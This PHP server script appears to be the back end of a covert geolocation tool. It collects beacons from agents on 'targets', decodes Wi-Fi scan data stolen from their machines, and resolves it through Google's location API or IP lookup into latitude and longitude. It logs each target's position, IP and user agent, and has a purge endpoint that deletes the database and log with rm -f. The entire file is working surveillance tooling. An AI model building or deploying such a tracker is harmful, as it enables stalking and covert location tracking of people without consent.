<?php

ini_set('display_errors', 'On');

// initialize the database
try {
    $dbname = 'data.db';
    $db = new PDO('sqlite:'.$dbname);
    //$db->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION  );
    $query = 'CREATE TABLE IF NOT EXISTS beacons (id integer primary key, time text, target text, agent text, ip text, port text, useragent text, comment text, lat text, lng text, acc text)';
    $db->query($query);
} catch (Exception $error) {
    die($error);
}

// global logging function
function logger($msg) {
    $stamp = date("m/d/Y H:i:s");
    $file = fopen('log.txt', 'a') or die("can't open file");
    fwrite($file, sprintf("[%s] %s\n", $stamp, $msg));
    fclose($file);
    return;
}

// global json response function
function respond($text) {
    $res = array();
    $res['msg'] = $text;
    echo json_encode($res);
    exit;
}

// global input filtering function
function sanitize($text) {
    $filtered = preg_replace( "/[^a-zA-Z0-9\s_\.-]/", "", $text );
    if (strcmp($text, $filtered) != 0) {
        logger(sprintf('[*] Input filtered: %s => %s', $text, $filtered));
    }
    return $filtered;
}

// ===== SERVICE CALLS =====

// returns the current server time
if (isset($_REQUEST['time'])) {
    $res = array();
    $dtg = date("F d, Y H:i:s");
    $res['dtg'] = $dtg;
    echo json_encode($res);
    exit;
}

// purges data files
if (isset($_REQUEST['purge'])) {
    $del = sanitize($_REQUEST['purge']);
    $res = array();
    if ($del == 'db') {
        if (file_exists($dbname)) { exec('rm -f '.$dbname); }
        $msg = 'database purged';
    } elseif ($del == 'log') {
        if (file_exists('log.txt')) { exec('rm -f log.txt'); }
        $msg = 'log purged';
    } else {
        $msg = 'file does not exist';
    }
    respond($msg);
}

// returns a list of all reporting agents
if (isset($_REQUEST['targets'])) {
    $res = array();
    $res['targets'] = array();
    $prep = $db->prepare("SELECT DISTINCT target FROM beacons ORDER BY target");
    $prep->execute();
    while ($row = $prep->fetch(PDO::FETCH_ASSOC)) {
        array_push($res['targets'], $row['target']);
    }
    echo json_encode($res);
    exit;
}

// returns specified target beacons
if (isset($_REQUEST['beacons'])) {
    $target = sanitize($_REQUEST['beacons']);
    $res = array();
    $prep = $db->prepare("SELECT * FROM beacons WHERE target = :target");
    $prep->execute(array(":target" => $target));
    while ($row = $prep->fetch(PDO::FETCH_ASSOC)) {
        $res[$row["id"]] = $row;
    }
    if (empty($res)) {
        respond('invalid target value');
    } else {
        echo json_encode($res);
        exit;
    }
}

// accepts agent information
// agent=target:origin:lat:lng:acc
if (isset($_REQUEST['target'], $_REQUEST['agent'])) {

    function addtodb($target, $agent, $ip, $port, $useragent, $comment, $lat, $lng, $acc="Unknown") {
        global $db;
        $stamp = date("m/d/Y H:i:s");
        $prep = $db->prepare("INSERT INTO beacons VALUES (NULL, :stamp, :target, :agent, :ip, :port, :useragent, :comment, :lat, :lng, :acc)");
        $prep->execute(array(":stamp" => $stamp, ":target" => $target, ":agent" => $agent, ":ip" => $ip, ":port" => $port, ":useragent" => $useragent, ":comment" => $comment, ":lat" => $lat, ":lng" => $lng, ":acc" => $acc));
        logger(sprintf('[*] Target location identified as Lat: %s, Lng: %s', $lat, $lng));
    }
    
    function getJSON($url) {
        try {
            $jsondata = file_get_contents($url);
            logger(sprintf('[*] API URL used: %s', $url));
            logger(sprintf('[*] JSON object retrived:%s%s', "\n", $jsondata));
        } catch (Exception $e) {
            logger(sprintf('[!] Error retrieving JSON object: %s', $e));
            logger(sprintf('[!] Failed URL: %s', $url));
            $jsondata = NULL;
        }
        return $jsondata;
    }
    
    function getCoordsbyIP($ip) {
        logger('[*] Attempting to geolocate by IP.');
        $url = sprintf('http://uniapple.net/geoip/?ip=%s', $ip);
        $jsondata = getJSON($url);
        if (!is_null(json_decode($jsondata))) {
            $jsondecoded = json_decode($jsondata);
            $lat = $jsondecoded->latitude;
            $lng = $jsondecoded->longitude;
            return array($lat, $lng);
        } else {
            logger('[!] Invalid JSON object. Giving up on host.');
            return NULL;
        }
    }
    
    function parseMac($output) {
        $wifidata = array();
        preg_match_all("/([\S]+?)\s(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})\s(.?\d+)\s/", $output, $matches, PREG_SET_ORDER);
        if (empty($matches)) {
            return NULL;
        }
        foreach (range(0,count($matches)-1,1) as $i) {
            $wifidata[$i][] = $matches[$i][1];
            $wifidata[$i][] = $matches[$i][2];
            $wifidata[$i][] = $matches[$i][3];
        }
        return $wifidata;
    }
    
    function parseWin($output) {
        $aps = array();
        $wifidata = array();
        $lastssid = '';
        $items = preg_split('/\s/', $output, NULL, PREG_SPLIT_NO_EMPTY);
        foreach (range(0,count($items)-1,1) as $i) {
            if ($items[$i] == 'SSID') {
                $items[$i+3];
                $lastssid = $items[$i+3];
                $aps[] = $lastssid;
            } elseif ($items[$i] == 'BSSID') {
                if (intval($items[$i+1]) > 1) {
                    $aps[] = $lastssid;
                }
                $aps[] = $items[$i+3];
            } elseif ($items[$i] == 'Signal') {
                $dBm = intval(substr($items[$i+2],0,-1)) - 100;
                $aps[] = strval($dBm);
            }
        }
        $wifidata = array_chunk($aps, 3);
        return $wifidata;
    }
    
    function parseNix($output) {
        $aps = array();
        $wifidata = array();
        $items = preg_split('/\s/', $output, NULL, PREG_SPLIT_NO_EMPTY);
        foreach (range(0,count($items)-1,1) as $i) {
            if ($items[$i] == 'Address:') {
                $aps[] = $items[$i+1];
            } elseif (preg_match('/^ESSID:/', $items[$i])) {
                $n = $i;
                $ssid = '';
                while (1) {
                    $ssid .= ' '.$items[$n];
                    if (preg_match('/"$/', $items[$n])) {
                        break;
                    }
                    $n += 1;
                }
                $aps[] = substr(trim($ssid),7,-1);
            } elseif (preg_match('/^level=/', $items[$i])) {
                $aps[] = substr($items[$i], 6);
            }
        }
        $wifidata = array_chunk($aps, 3);
        foreach (range(0,count($wifidata)-1,1) as $i) {
            array_splice($wifidata[$i], 0, count($wifidata[$i]), array($wifidata[$i][2], $wifidata[$i][0], $wifidata[$i][1]));
        }
        return $wifidata;
    }

    // initialize parameters
    logger('[*] ==================================================');
    $target      = sanitize($_REQUEST['target']);
    $agent       = sanitize($_REQUEST['agent']);
    if (isset($_REQUEST['comment'])) {
        $comment = sanitize(base64_decode($_REQUEST['comment']));
    } else {
        $comment = '';
    }
    $ip          = $_SERVER['REMOTE_ADDR'];
    $port        = $_SERVER['REMOTE_PORT'];
    $useragent   = $_SERVER['HTTP_USER_AGENT'];
    logger(sprintf('[*] Connection from %s @ %s:%s via %s', $target, $ip, $port, $agent));
    logger(sprintf('[*] Query String: ?%s', $_SERVER['QUERY_STRING']));
    logger(sprintf('[*] User-Agent: %s', $useragent));
    logger(sprintf('[*] Comment: %s', $comment));

    // handle tracking data
    if (isset($_REQUEST['lat'], $_REQUEST['lng'], $_REQUEST['acc'])) {
        $lat    = sanitize($_REQUEST['lat']);
        $lng    = sanitize($_REQUEST['lng']);
        $acc    = sanitize($_REQUEST['acc']);
        addtodb($target, $agent, $ip, $port, $useragent, $comment, $lat, $lng, $acc);
        respond('success');
    } elseif (isset($_REQUEST['os'], $_REQUEST['data'])) {
        $os     = sanitize($_REQUEST['os']);
        $data   = sanitize($_REQUEST['data']);
        $output = base64_decode($data);
        logger(sprintf('[*] Data received:%s%s', "\n", $data));
        logger(sprintf('[*] Decoded Data:%s%s', "\n", $output));
        if ($data) {
            if (preg_match('/^mac os x/', strtolower($os))) {
                $wifidata = parseMac($output);
            }
            elseif (preg_match('/^windows/', strtolower($os))) {
                $wifidata = parseWin($output);
            }
            elseif (preg_match('/^linux/', strtolower($os))) {
                $wifidata = parseNix($output);
            }
            else { $wifidata = NULL;
            }
            if (!empty($wifidata)) { // handle recognized data
                $url = 'https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true';
                foreach ($wifidata as $ap) {
                    $node = '&wifi=mac:' . $ap[1] . '|ssid:' . urlencode($ap[0]) . '|ss:' . $ap[2];
                    $url .= $node;
                }
                $slicedurl = substr($url,0,1900);
                $jsondata = getJSON($slicedurl);
                if (!is_null(json_decode($jsondata))) {
                    $jsondecoded = json_decode($jsondata);
                    if ($jsondecoded->status != "ZERO_RESULTS") {
                        $acc = $jsondecoded->accuracy;
                        $lat = $jsondecoded->location->lat;
                        $lng = $jsondecoded->location->lng;
                        addtodb($target, $agent, $ip, $port, $useragent, $comment, $lat, $lng, $acc);
                        respond('success');                    
                    } else { // handle zero results returned from API
                        logger('[*] No results.');
                    }
                } else { // handle invalid data returned from API
                    logger('[!] Invalid JSON object.');
                }
            } else { // handle unrecognized data
                logger('[*] No parsable WLAN data received from the agent. Unrecognized target or wireless is disabled.');
            }
        } else { // handle blank data
            logger('[*] No data received from the agent.');
        }
    }
    
    // fall back
    if (!is_null($coords = getCoordsbyIP($ip))) {
        addtodb($target, $agent, $ip, $port, $useragent, $comment, $coords[0], $coords[1]);
        respond('success');
    }
}

respond('invalid request');

// ===== END EXECUTION =====

?>